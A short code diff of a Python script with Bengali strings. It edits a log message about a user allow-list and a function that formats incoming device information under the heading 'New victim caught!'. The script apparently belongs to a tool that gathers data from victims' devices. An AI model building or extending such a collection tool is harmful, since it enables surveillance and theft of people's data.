@@ -24,7 +24,7 @@ def load_allowed_users():
             data = json.load(f)
             return set(data.get("allowed_users", []))
     except FileNotFoundError:
-        logger.error("user.json ফাইলটি পাওয়া যায়নি।")
+        logger.error("user.json ফাইলটি পাওয়া যায় নি।")
         return set()
 
 ALLOWED_USERS = load_allowed_users()
@@ -106,7 +106,7 @@ def receive_data():
         
         # ডিভাইসের অন্যান্য তথ্য পাঠানো
         device_info = data.get('device_info', {})
-        info_message = f"**নতুন শিকার ধরা পড়েছে!**\n\n"
+        info_message = f"**নতুন শিকার ধরা পড়েছে!**\n\n"
         for key, value in device_info.items():
             info_message += f"**{key.capitalize()}:** `{value}`\n"
             
